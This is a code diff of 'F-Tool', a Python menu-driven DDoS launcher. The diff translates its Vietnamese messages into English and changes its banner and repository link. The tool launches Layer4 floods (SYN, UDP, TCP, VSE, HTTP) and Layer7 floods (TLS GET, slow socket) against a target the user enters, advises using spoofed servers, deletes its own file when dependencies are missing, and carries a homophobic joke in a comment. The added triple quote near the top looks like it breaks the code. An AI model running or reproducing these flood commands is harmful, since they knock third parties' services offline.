@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 
-
+"""
 from shutil import which
 from urllib import parse
 from os import system
@@ -59,22 +59,14 @@ class Home:
 			else:
 				time.sleep(1)
 
-	def home(self):
-		print(f"""{Color.LG}
-
-    ______    ______ ____   ____   __       
-   / ____/   /_  __// __ \ / __ \ / /       
-  / /_ ______ / /  / / / // / / // /        
- / __//_____// /  / /_/ // /_/ // /___      
-/_/         /_/   \____/ \____//_____/      
-       __                   __              
-  ____/ /____ _ __  __ ____/ /____ _ __  __ 
- / __  // __ `// / / // __  // __ `// / / / 
-/ /_/ // /_/ // /_/ // /_/ // /_/ // /_/ /  
-\__,_/ \__,_/ \__,_/ \__,_/ \__,_/ \__,_/   
-                                            
-""")
-
+	def home(self): # don't edit this banner lol
+		print(f"""
+                        {Color.LG}╔══════════════════════╗
+    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
+    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/22      {Color.LG}║
+    {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
+                        {Color.LG}╚══════════════════════╝
+    {Color.LR}[{Color.LG}>     Made with By NguyenDangTrinh    {Color.LG}<{Color.LR}]""")
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
@@ -138,7 +130,7 @@ class response_url:
 			else:
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Kiểm tra kết nối Internet của bạn."
+			return Color.LR+"Error: Check your Internet Connection."
 
 	def ip_lookup(self, ip):
 		try:
@@ -152,7 +144,7 @@ class response_url:
 		except KeyError:
 			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Kiểm tra kết nối Internet của bạn."
+			return Color.LR+"Error: Check your Internet Connection."
 
 	def http_status(self, url):
 		try:
@@ -194,12 +186,12 @@ class response_url:
 			elif resp.status_code == 508:
 				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
 			else:
-				return Color.LR+f"    [+] Kết quả: (Hết thời gian kết nối)"
+				return Color.LR+f"    [+] Result: (Connection timeout)"
 
 		except httpx.TimeoutException:
-			return Color.LR+f"     [+] Kết quả: (Hết thời gian kết nối)"
+			return Color.LR+f"     [+] Result: (Connection timeout)"
 		except httpx.ConnectError:
-			return Color.LR+f"    [+] Kết quả: Đã xảy ra lỗi"
+			return Color.LR+f"    [+] Result: Error occurred"
 		except httpx.UnsupportedProtocol:
 			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 
@@ -212,7 +204,7 @@ class response_url:
 			else:
 				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Kiểm tra kết nối Internet của bạn."
+			return Color.LR+"Error: Check your Internet Connection."
 
 	def extractlink(self, url):
 		try:
@@ -225,7 +217,7 @@ class response_url:
 			else:
 				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Kiểm tra kết nối Internet của bạn."
+			return Color.LR+"Error: Check your Internet Connection."
 
 
 class Tool:
@@ -264,7 +256,7 @@ class Tool:
 						socks5 = requests.get(proxy["url"], headers=self.headers).text
 			os.system('clear')
 		except requests.exceptions.ConnectionError:
-			sys.exit(Color.LR+"\nError: Kiểm tra kết nối Internet của bạn.")
+			sys.exit(Color.LR+"\nError: Check your Internet Connection.")
 		print(f"""{Color.LG}
 
      ___               _
@@ -418,11 +410,11 @@ class Tool:
 		try:
 			spdt = speedtest.Speedtest()
 
-			print(Color.LC+"[*] Đang tải danh sách máy chủ...")
+			print(Color.LC+"[*] Loading Server List...")
 			spdt.get_servers()
 			time.sleep(0.1)
 
-			print(Color.LC+"[*] Chọn máy chủ tốt nhất...")
+			print(Color.LC+"[*] Choosing Best Server...")
 			get = spdt.get_best_server()
 			time.sleep(0.1)
 
@@ -430,10 +422,10 @@ class Tool:
 			time.sleep(0.1)
 			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")
 
-			print(Color.LC+"\n[*] Thực hiện kiểm tra tải xuống...")
+			print(Color.LC+"\n[*] Performing Download Test...")
 			download_result = spdt.download()
 
-			print(Color.LC+"[*] Thực hiện kiểm tra tải lên...")
+			print(Color.LC+"[*] Performing Upload Test...")
 			upload_result = spdt.upload()
 			ping_result = spdt.results.ping
 
@@ -447,11 +439,11 @@ class Tool:
 			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
 			print("\n")
 		except Exception:
-			print(Color.LR+"Error: Kiểm tra kết nối Internet của bạn.\n\n")
+			print(Color.LR+"Error: Check your Internet Connection.\n\n")
 
 
 	def bbos(self):
-		print(Color.LR+"\n\n    [>    "+Color.LG+"Vui lòng sử dụng máy chủ giả mạo để có trải nghiệm tốt nhất."+Color.LR+"    <]\n\n")
+		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
 		print("\n")
@@ -492,7 +484,7 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: Công cụ nguồn van UDP lũ lụt cụ thể")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
@@ -509,9 +501,9 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '2']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
@@ -519,9 +511,9 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['03', '3']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
@@ -530,9 +522,9 @@ class Tool:
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['04', '4']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
@@ -541,18 +533,18 @@ class Tool:
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['05', '5']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
 				self.l4()
 			elif option in ['home', 'HOME']:
@@ -590,7 +582,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Phương pháp mạnh mẽ Mục tiêu Có thể chết vì Cringe (JS)")
+		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -602,33 +594,33 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '2']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '3']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['04', '4']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-					print(Color.LG+f"\n [!] Đã gửi cuộc tấn công thành công!\n")
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Thử lại")
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
 				self.l7()
 			elif option in ['home', 'HOME']:
@@ -684,7 +676,7 @@ def spoof_useragents():
 	}
 
 def main():
-	#  kiểm tra xem bạn có đồng tính không 😏
+	#  checking if you're gay 😏
 	F_Tool.styleText("[+] Checking Dependencies...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
@@ -704,7 +696,7 @@ def main():
 	except IsADirectoryError:pass
 	except FileNotFoundError:
 		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-		print("\n[+] Vui lòng tải xuống trên GitHub, or git clone https://github.com/DauDau432/F-Tool\n")
+		print("\n[+] Please download on GitHub, or git clone: https://github.com/ngdangtr/F-Tool\n")
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
